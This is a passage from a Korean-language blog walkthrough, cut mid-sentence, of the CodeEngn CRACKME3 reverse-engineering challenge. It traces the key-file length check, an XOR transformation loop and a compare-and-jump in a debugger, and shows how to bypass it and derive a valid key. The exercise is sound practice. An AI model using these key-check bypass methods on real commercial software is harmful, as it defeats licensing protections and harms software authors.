url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/UlEQVR42j2PO0/DMAAGv8R1IbRx2+BHnNhOmocbUIqEVAhqWFgpDEhIiF/QEfX/LyzQ20+6Q5Yra2oh06pe65Qz6Zbez+QUArgGAvwzKcuuLK2xVinJWDwhBDqTxlRSppwn0QUlTFLvpUsQAfRsgpBp3fZlXWS51qnYbBrOE/R9t93uVLq2rsmlWd480bevyvs45bHmCyUivgSmIWFtcWdXSoq8KDyLBQkvcTr9HI8nrQ9N+1G69+1wuP9+jZqRdSO7HRfr53k2hPQB2LPJyyocKNkHwQDsEDwiy5SxNRfKOWdSqfuOf45wCCogQRCew8NZLK7ms5gxSv9+fgEOtRueWS2QSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7bb750c1f0b2c052fde6cbd1c282ad67/c9b55/16.webp 165w,\n/static/7bb750c1f0b2c052fde6cbd1c282ad67/f2908/16.webp 330w,\n/static/7bb750c1f0b2c052fde6cbd1c282ad67/ff4b8/16.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7bb750c1f0b2c052fde6cbd1c282ad67/04c57/16.png 165w,\n/static/7bb750c1f0b2c052fde6cbd1c282ad67/d9ecf/16.png 330w,\n/static/7bb750c1f0b2c052fde6cbd1c282ad67/32056/16.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7bb750c1f0b2c052fde6cbd1c282ad67/32056/16.png\"\n            alt=\"after ReadFile\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ReadFile 함수를 지나온 직후이다. 아무것도 없던 402008주소지에 CRACKME3.KEY에 입력했던 ASCII “12345”가 들어 있다. 401066주소지에서 CMP를 하고 jump를 수행하는데, 4021A0 주소지에 5가 들어 있다. 12와 같지 않으므로 401037로 jump한다. 그렇게 되면 위에서 수행하지 않았던 함수 4012F5를 수행하고, 전과 같이 “CrackMe v3.0” 문자열 뒤에 Uncracked 문자열이 붙게 된다. 4021A0은 ReadFile의 인자로서 들어가는 pBytesRead였다. CRACKME3.KEY파일에 들어가는 문자열이 16진수로 12, 즉 18바이트가 되면 이를 우회할 수 있을 것이다. CRACKME3.KEY파일을 다음과 같이 수정하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 176px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.51515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABMklEQVR42j2N206DQABE+Q+thYW9QXeBZekCRq2mGl+MMWmVai92LS0VqLWJ/2+wick8zDycM8buq9IfC5WISHIRMRGxtoielL6IeCR5rEKViP/0VShj//rmom62xv67ub0bdEF3vlqUdVnoZVXpzb6pmmL2/tIcdg/3QwucQGRCZAK7k2ayr0ILnOaTsbEpV54HIbZiJdIszrJYJWFy3o+TMEkjlUrmYQeeQWQibNl2h/uU+xQiMxTMGA4vqetwn/YYZhxR1+4xwjghBLgeJNRhDMs4kJL7Ab0apAhbCFuYAIQtIwjI0+hxOh2/r3Rdab18zd/yw09TFnO9nE0Wk+168ZyPivV8+6nrZgORSaiNCcAEGH96G5N2I2IRasPW3d5S1yGuQ13n+OZ6KMvkETvCvwgLUWFYszdFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4f4f6ff0e150f768aff7c309ac90673e/c9b55/17.webp 165w,\n/static/4f4f6ff0e150f768aff7c309ac90673e/eb777/17.webp 176w\"\n              sizes=\"(max-width: 176px) 100vw, 176px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4f4f6ff0e150f768aff7c309ac90673e/04c57/17.png 165w,\n/static/4f4f6ff0e150f768aff7c309ac90673e/06437/17.png 176w\"\n            sizes=\"(max-width: 176px) 100vw, 176px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4f4f6ff0e150f768aff7c309ac90673e/06437/17.png\"\n            alt=\"CRACKME3.KEY\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>우회가 되는 것을 확인하였다. 계속 한줄씩 진행하던 도중 다음과 같이 문자열이 변형되는 것을 발견하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.363636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAsElEQVR42i3CPQuCQAAA0PvwTD1PQ9PzW89QhKQhiVRKaC+i2qOhoSWqpd8fQY8HPqF3j/LA85M0in1ebpf5uaXxiJYaFSrLNMVGAACZsAmWKPiD8Bf0dbWaNZyLfFqlYV4My+C4QGIkV4y4OpF0glVJkhGyddNnJueeME1uGK6ijMHj/bzeXmG4z7JDIXZOfUo2Fy8eNKejtGN6bxiNZc0hHBDsMe4IWWPcI9RCuPoCoqgTekPVml0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0522c40ad6a12dff32b4c4dc5ae26c09/c9b55/18.webp 165w,\n/static/0522c40ad6a12dff32b4c4dc5ae26c09/f2908/18.webp 330w,\n/static/0522c40ad6a12dff32b4c4dc5ae26c09/ff4b8/18.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0522c40ad6a12dff32b4c4dc5ae26c09/04c57/18.png 165w,\n/static/0522c40ad6a12dff32b4c4dc5ae26c09/d9ecf/18.png 330w,\n/static/0522c40ad6a12dff32b4c4dc5ae26c09/32056/18.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0522c40ad6a12dff32b4c4dc5ae26c09/32056/18.png\"\n            alt=\"after 401311\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>함수 401311을 통과하자 402008주소지에 ASCII “123456789abcdef012”라고 입력되어 있던 문자열이 앞의 아홉 바이트는 모두 p로 바뀌었고, 열 번째 문자열부터 다섯 바이트는 변형이 되었으며, 나머지 바이트는 유지되었다. 아래는 함수 401311과 함수 시작 시 레지스터 상태이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 414px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBUlEQVR42mWQSU/cQBSEn7fR0O6922177O7xvsAAysIBoYQgJbfcgjRKrvkLOZFADhzzp5OZEUIopXcq1adXKvj98HB///Pu7tHab1J+7tqvAO8BrlH8aZoux2F7fv69rrYA7zzvBuDDi9NGac2LYi1lqTWfplZJiuMFipN5Ppumqu9d3ZScIS4wZUhKkmi6WIQAANaWzq6GfjamNsZ0Xb9YLAGAsPzk9HXTtmXJKCWYMEoZxkRwEUULDwIAH1arrFiZrpt04rSWwzjAXpxnby+uqspN85xl6RFClBKCMecsDIND5gCnTT0oZYVk1tmDL8TqzcWVc0Xft0JJzhkXTCmhtEYIPcNlkTnXSlmaVKdp+vQ532xe1bU1iQIAfy/P94Mg8H3/Bdw0o1JWKT6Mg9ZJniV1Pc0nl3W1rqzjjEkhOWWCMaWUlMJaG4bhHl5lbTsnyZpSbJ0lBAcBJInbbk/LY5OOYkH8kIQRD6PdWFEUhcvl0vO8J7gZtd4NVldu5+5r337p5BRHRQQIQAAoAAngwbPyfe12V7vUiTo+OVZCAgBj+fXHy2F2+ZouMeygCCAECP6Dm3owpuKcjvOYaEXwkZLu8Ye6uInRGScuji1CzRHqEEoQxYRSfBgsL4usaydj1lJyYwylVDOs+g369YfOG4FihAmOMYljgjGJsRCcUfoP/gtgoz2S9f6Q0gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/c9b55/19.webp 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/f2908/19.webp 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/3ca80/19.webp 414w\"\n              sizes=\"(max-width: 414px) 100vw, 414px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/04c57/19.png 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/d9ecf/19.png 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/b910a/19.png 414w\"\n            sizes=\"(max-width: 414px) 100vw, 414px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/218639dddbab0a31ae10e4ba25f43516/b910a/19.png\"\n            alt=\"reg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>문자열의 변형은 XOR 연산으로 인해 일어난 것임을 알 수 있었다. EBX의 일부인 BL을 41로 채우고, 이를 1씩 증가시켜 4F가 될 때까지 반복시키기 때문에 앞의 14바이트만 변형이 일어나고 나머지 문자열은 그대로 유지되는 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA9klEQVR42l2OWU7DMABEJ7YTO7GdZilZnDhbqwZaxFZVrYSAj4K4Qi+AED0EZ0etBB+M3kjvZ6TB97w7VsNQGGvrwZp8+1y87tMikIVWWmqtJxMSRQCIH8RhqLRW5yoAmPZNWPVtXvZt05hML27S3UaVxMkd4hLiEErB2GksZaJUkKZpnMRSSq0VluOs7xZ9aS/Hcd7ai/WjedvHVoja9wLBufA8ATiAy5hmzPU87rqcMpdRhqapsswOxgxdKQMSTavV6rrOEk6p8JjvM87J6SEoIPAvx6/Pw+Gjr95N/gLctrOHbvOkqh3CK4RL4O6XNbA9y/0fPy3pF0D9yWBtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/078b816b0464797335a26e8e4019c9bb/c9b55/20.webp 165w,\n/static/078b816b0464797335a26e8e4019c9bb/f2908/20.webp 330w,\n/static/078b816b0464797335a26e8e4019c9bb/ff4b8/20.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/078b816b0464797335a26e8e4019c9bb/04c57/20.png 165w,\n/static/078b816b0464797335a26e8e4019c9bb/d9ecf/20.png 330w,\n/static/078b816b0464797335a26e8e4019c9bb/32056/20.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/078b816b0464797335a26e8e4019c9bb/32056/20.png\"\n            alt=\"return\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>함수가 끝나고 리턴한 이후이다. 어떠한 과정을 거치고 AL의 값을 AND연산한 결과를 바탕으로 jump를 수행하는데, 이 분기하는 지점은 위에서 Uncracked를 띄우는 함수 4012F5를 지나가는 곳이다. Uncracked가 뜨지 않게 하기 위해서는 AL이 반드시 1이 되어야 한다. 주소지 40109F에서 jump가 발생하지 않게 하기 위한 조건을 위의 어셈블리어를 분석해 가며 조사하였다.</p>\n<p>| XOR DWORD PTR DS:[4020F9],12345678 | 4020F9 주소지에 들어있는 문자열과 12345678를 XOR연산을 시키고 있다. 주소지 4020F9에는 4C7이 들어 있으며, 12345678과 XOR연산을 한 결과는 123452BF가 되며 이것이 주소지 4020F9에 담긴다. |\r\n| ADD ESP,4 | 스택을 쌓는 과정이다. |\r\n| PUSH 20.00402008 | CRACKME3.KEY의 문자열이 변형된 결과인 ppp~f012 문자열을 스택에 쌓는다. |\r\n| CALL 20.0040133C | 이 함수를 통과한 후 EAX에 32313066이라는 값이 쌓였다. 주소지 402008의 맨 마지막 4바이트가 little endian 방식으로 저장된 것과 같다. |\r\n| ADD ESP,4 | 스택을 쌓는 과정이다. |\r\n| CMP EAX,DWORD PTR DS:[4020F9] | EAX에 있는 32313066과 4020F9 주소지에 있는 123452BF를 비교한다. |\r\n| SETE AL | SETE은 Set if Equal이다. 위의 비교대상이 같다면 AL을 1로, 다르면 0으로 세트한다. |\r\n| PUSH EAX | 현재 EAX에 있는 값을 스택에 쌓는다. |\r\n| TEST AL,AL | AL값끼리 AND연산을 진행한다. |\r\n| JE SHORT 20.00401037 | 결과가 0일 시 jump를 수행한다. |</p>\n<p>결론적으로 jump를 수행하는 40109F에서 jump를 우회하기 위해서는 4020F9에 little endian으로 들어있는 아스키 코드와 CRACKME3.KEY에 저장되어 있는 18바이트의 문자열 중 마지막 4바이트의 아스키 코드가 일치하면 된다. 한편, 주소지 4020F9는 CRACKME3.KEY파일에 들어있는 문자열을 변형시키던 함수 401311에서 영향을 받은 곳이었다. 어떤 방식으로 영향을 받았는지 다시 확인하기 위해 함수 401311을 다시 조사하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 414px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBUlEQVR42mWQSU/cQBSEn7fR0O6922177O7xvsAAysIBoYQgJbfcgjRKrvkLOZFADhzzp5OZEUIopXcq1adXKvj98HB///Pu7tHab1J+7tqvAO8BrlH8aZoux2F7fv69rrYA7zzvBuDDi9NGac2LYi1lqTWfplZJiuMFipN5Ppumqu9d3ZScIS4wZUhKkmi6WIQAANaWzq6GfjamNsZ0Xb9YLAGAsPzk9HXTtmXJKCWYMEoZxkRwEUULDwIAH1arrFiZrpt04rSWwzjAXpxnby+uqspN85xl6RFClBKCMecsDIND5gCnTT0oZYVk1tmDL8TqzcWVc0Xft0JJzhkXTCmhtEYIPcNlkTnXSlmaVKdp+vQ532xe1bU1iQIAfy/P94Mg8H3/Bdw0o1JWKT6Mg9ZJniV1Pc0nl3W1rqzjjEkhOWWCMaWUlMJaG4bhHl5lbTsnyZpSbJ0lBAcBJInbbk/LY5OOYkH8kIQRD6PdWFEUhcvl0vO8J7gZtd4NVldu5+5r337p5BRHRQQIQAAoAAngwbPyfe12V7vUiTo+OVZCAgBj+fXHy2F2+ZouMeygCCAECP6Dm3owpuKcjvOYaEXwkZLu8Ye6uInRGScuji1CzRHqEEoQxYRSfBgsL4usaydj1lJyYwylVDOs+g369YfOG4FihAmOMYljgjGJsRCcUfoP/gtgoz2S9f6Q0gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/c9b55/21.webp 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/f2908/21.webp 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/3ca80/21.webp 414w\"\n              sizes=\"(max-width: 414px) 100vw, 414px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/04c57/21.png 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/d9ecf/21.png 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/b910a/21.png 414w\"\n            sizes=\"(max-width: 414px) 100vw, 414px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/218639dddbab0a31ae10e4ba25f43516/b910a/21.png\"\n            alt=\"function 401311\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>반복을 진행하며 EAX에 있는 값을 주소지 4020F9에 더하고 있는 것을 볼 수 있다. 즉 최종적으로 4020F9에 들어가는 결과값은 CRACKME3.KEY의 앞 14바이트에 어떤 문자열이 오느냐에 따라 달려 있다고 볼 수 있다. 정리하자면, CRACKME3.KEY에 들어 있는 문자열의 앞 14바이트가 함수 401311을 통해 생성된 4020F9 주소지에 저장되는 값을 0x12345678과 AND연산한 결과가 CRACKME3.KEY의 나머지 4바이트와 일치하는 것이 정답의 조건이 된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 393px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.909090909090907%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABGElEQVR42o3GvU+DQBzG8R+98n4c5Y6DK1IxEEQ4XqqT0cHEOBhpdXJoQicTo3+Ak6NDq4N/s7GJg3HxkyffPEAI9iaY0iiOM9vWhfCEcH3uWCMwn17w2ysWSJ0CBAAhwAh+2W62H+/bzeazbZ9VrT9IVlNxHwR3jrMs0otOXpXl4yy+5f6SkN7zFtjpXbenbIHtGxjWw3pYDcPDUbHQ9DpJLjk/Mwypqk2cnubyPMuuLauxrFrTpWHU+neladaqKsGjE+5PmB/vz1JCNM6JrisIAVLAzY9ZV0mZMWorCozHgNCuPwfaeds01bzruvlJVVVVWRaHRZ7njPlTEcVRxAMRhoJS9ncQ7UWc+4zSMOQY2wCAduAfvgCtiCWOe/HtgQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/01e59951367951a4c336595cdf49838c/c9b55/22.webp 165w,\n/static/01e59951367951a4c336595cdf49838c/f2908/22.webp 330w,\n/static/01e59951367951a4c336595cdf49838c/8efa6/22.webp 393w\"\n              sizes=\"(max-width: 393px) 100vw, 393px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/01e59951367951a4c336595cdf49838c/04c57/22.png 165w,\n/static/01e59951367951a4c336595cdf49838c/d9ecf/22.png 330w,\n/static/01e59951367951a4c336595cdf49838c/d72ec/22.png 393w\"\n            sizes=\"(max-width: 393px) 100vw, 393px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/01e59951367951a4c336595cdf49838c/d72ec/22.png\"\n            alt=\"401093\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>우선, 주소 401093 지점 이전에 4020F9 값을 EAX와 같게 조작해 주고 경과를 관찰해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.90909090909091%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAeElEQVR42mPIEBcKk1USEROREOfn42NVt1fiUeNklmVkEGFgYGKAASY2dg4OTgYuLiY2NkZmZgZOTkZ2diaGypyMuNA0EVFndXU/CUk3/sB0Xl0rBlldBgFDBgYDMNJnYDDi4LDl4DDj4bVlZzdnZTHh4bVlYzMDAJhlC6EjcRqdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f005357d884b0a2ca2d4d08b557bec17/c9b55/23.webp 165w,\n/static/f005357d884b0a2ca2d4d08b557bec17/f2908/23.webp 330w,\n/static/f005357d884b0a2ca2d4d08b557bec17/ff4b8/23.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f005357d884b0a2ca2d4d08b557bec17/04c57/23.png 165w,\n/static/f005357d884b0a2ca2d4d08b557bec17/d9ecf/23.png 330w,\n/static/f005357d884b0a2ca2d4d08b557bec17/32056/23.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f005357d884b0a2ca2d4d08b557bec17/32056/23.png\"\n            alt=\"bypass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>JE 부분에서 jump가 일어나지 않았고 CrackMe 문자열 뒤에 Cracked가 뜸으로써 우회가 성공하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 266px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB10lEQVR42o3R4W/SQBQA8P5vzokmxphlsolssGXGRMMgsyP+S/4HfPCTSmHABoVCe+21lAormA561/ZazPoMxeiSscRfXi7vPrzce/e41/vpg2wms5/OZjLZzN7eq93D7JujXPb5s1Rqe+vpk8f3I7W9ld7d2Xn5gisWC+Xzj2el03OePyudloqFMs9/KvMnx/mjXO44vyHyhwfFwod3b0+4yWRMCFmszF3XJYS4ycV7GKWUMabrOkcpAYA4jmElvl1Zn0mWuJPGSXYLANOpzbnuAgBms97E+goxIIT6A7nbvkIq/mGNZakvdjqdtnjVvNSwbo3MkWUtl0sAsK+vOUpcAGh9eS98frSMfvUlSUVI1TSkoL40kHo9We7rWG9eXIptEWMjTrr78zKlFACIMyQ/9WXEoihiLAxYEIYhC0PGWLjCfD8IAhaG0d8Z18V3Z/4v/4qnth0EASGEUup5dOP3rtfh+74f+K672kYURYZhcJZlLRaLG8e52WQ+n9u2jRAaj8e1mlCtCsZwiDEeDAaqqnKz6ZQx5nmef4/neYwxx3G63Z5pmtXv3yqVioKQLMuiKI5GJieKHYyx+gBN0xRFaTQatVqt1Wq1ms16vS4IgiRJjcbFb4vlU0tn1OHbAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/33c2430dc25e7c2dbd0349e00b315937/c9b55/24.webp 165w,\n/static/33c2430dc25e7c2dbd0349e00b315937/d8e38/24.webp 266w\"\n              sizes=\"(max-width: 266px) 100vw, 266px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/33c2430dc25e7c2dbd0349e00b315937/04c57/24.png 165w,\n/static/33c2430dc25e7c2dbd0349e00b315937/b4ffe/24.png 266w\"\n            sizes=\"(max-width: 266px) 100vw, 266px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/33c2430dc25e7c2dbd0349e00b315937/b4ffe/24.png\"\n            alt=\"good work cracker 2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>단, 완성된 창에서 “Cracked by: CodeEngn이 아닌 다른 문자열이 들어가 있다. CodeEngn 대신에 들어가 있는 문자열은 CRACKME3.KEY 파일에 넣었던 문자열의 앞 14바이트가 변조된 값이다. 변조 과정은 XOR 연산이었으며, XOR 연산은 역연산을 해도 같은 결과가 나오므로 변조 전의 문자가 무엇이었는지를 다음과 같은 과정으로 추적하였다.</p>\n<p>| CodeEngn 문자열의 ASCII 코드\r\nC = 0x43   o = 0x6f   d = 0x64   e = 0x65\r\nE = 0x45   n = 0x6e   g = 0x67   n = 0x6e</p>\n<p>이 CodeEngn의 아스키 코드를 41부터 1씩 증가시켜가며 XOR 연산을 시킨다.\r\n결과는 아래와 같다.\r\n0x02 0x2d 0x27 0x21 0x00 0x28 0x20 0x26\r\n아스키 코드 0x21 아래로는 문자로 표기할 수 없다. |</p>\n<p>9번째 바이트부터 14번째 바이트까지는 없어져야 한다. 여기서 잠시 함수 401311을 다시 확인해 보도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 414px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBUlEQVR42mWQSU/cQBSEn7fR0O6922177O7xvsAAysIBoYQgJbfcgjRKrvkLOZFADhzzp5OZEUIopXcq1adXKvj98HB///Pu7tHab1J+7tqvAO8BrlH8aZoux2F7fv69rrYA7zzvBuDDi9NGac2LYi1lqTWfplZJiuMFipN5Ppumqu9d3ZScIS4wZUhKkmi6WIQAANaWzq6GfjamNsZ0Xb9YLAGAsPzk9HXTtmXJKCWYMEoZxkRwEUULDwIAH1arrFiZrpt04rSWwzjAXpxnby+uqspN85xl6RFClBKCMecsDIND5gCnTT0oZYVk1tmDL8TqzcWVc0Xft0JJzhkXTCmhtEYIPcNlkTnXSlmaVKdp+vQ532xe1bU1iQIAfy/P94Mg8H3/Bdw0o1JWKT6Mg9ZJniV1Pc0nl3W1rqzjjEkhOWWCMaWUlMJaG4bhHl5lbTsnyZpSbJ0lBAcBJInbbk/LY5OOYkH8kIQRD6PdWFEUhcvl0vO8J7gZtd4NVldu5+5r337p5BRHRQQIQAAoAAngwbPyfe12V7vUiTo+OVZCAgBj+fXHy2F2+ZouMeygCCAECP6Dm3owpuKcjvOYaEXwkZLu8Ye6uInRGScuji1CzRHqEEoQxYRSfBgsL4usaydj1lJyYwylVDOs+g369YfOG4FihAmOMYljgjGJsRCcUfoP/gtgoz2S9f6Q0gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/c9b55/25.webp 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/f2908/25.webp 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/3ca80/25.webp 414w\"\n              sizes=\"(max-width: 414px) 100vw, 414px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/218639dddbab0a31ae10e4ba25f43516/04c57/25.png 165w,\n/static/218639dddbab0a31ae10e4ba25f43516/d9ecf/25.png 330w,\n/static/218639dddbab0a31ae10e4ba25f43516/b910a/25.png 414w\"\n            sizes=\"(max-width: 414px) 100vw, 414px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/218639dddbab0a31ae10e4ba25f43516/b910a/25.png\"\n            alt=\"401311\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>40132A에서 AL이 0과 같을 시 함수를 바로 빠져나오는 것을 볼 수 있다. 즉 아홉번째 반복에서 BL값인 0x49와 XOR 연산을 하였을 때 null이 되는 것을 아홉번째 바이트에 들어가도록 하고, 10번째 바이트부터 15번째 바이트는 아무 문자나 넣어도 상관 없을 것이다.  맨 마지막 4바이트는  위에서 4020F9 주소지에서 연산했던 과정과 같으므로 위와 같은 과정을 통해 찾았다. 이로써 